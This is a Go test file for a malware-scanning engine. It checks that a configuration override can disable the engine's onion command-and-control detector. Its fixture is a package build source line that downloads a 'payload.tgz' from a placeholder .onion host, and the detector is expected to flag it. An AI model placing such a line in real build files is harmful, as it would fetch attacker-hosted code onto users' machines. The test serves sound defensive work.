package detect_test

import (
	"os"
	"path/filepath"
	"testing"

	"github.com/vulnetix/malscan-engine/config"
	"github.com/vulnetix/malscan-engine/detect"
)

// End-to-end through the real runtime path: config.Resolve merges the embedded
// repo defaults with a system override, and the resolved capability map gates
// the engine's detectors.
func TestConfigShortCircuitsDetect(t *testing.T) {
	onion := "source=('http://abcdefghij234567.onion/payload.tgz')\n"
	mk := func(caps map[string]bool) *detect.PackageContext {
		return &detect.PackageContext{
			Name:            "p",
			Ecosystem:       "npm",
			PkgbuildContent: onion,
			Capabilities:    caps,
		}
	}

	// No override: Resolve returns the embedded npm default (onion-c2 on) → flagged.
	empty := t.TempDir()
	base, err := config.Resolve(empty, "npm")
	if err != nil {
		t.Fatal(err)
	}
	if !detect.IsMalicious(detect.Detect(mk(base.Capabilities))) {
		t.Fatal("expected malicious under embedded default (onion-c2 enabled)")
	}

	// A system override disabling onion-c2 overlays the default → short-circuit.
	dir := t.TempDir()
	body := `{"ecosystem":"npm","capabilities":{"onion-c2":false}}`
	if err := os.WriteFile(filepath.Join(dir, "npm.json"), []byte(body), 0o644); err != nil {
		t.Fatal(err)
	}
	over, err := config.Resolve(dir, "npm")
	if err != nil {
		t.Fatal(err)
	}
	if detect.IsMalicious(detect.Detect(mk(over.Capabilities))) {
		t.Fatal("override disabling onion-c2 should short-circuit the detector")
	}
	// The overlay is per key: other detectors from the default remain enabled.
	if !over.Enabled("manifest-patterns") {
		t.Fatal("non-overridden default capability should stay enabled")
	}
}
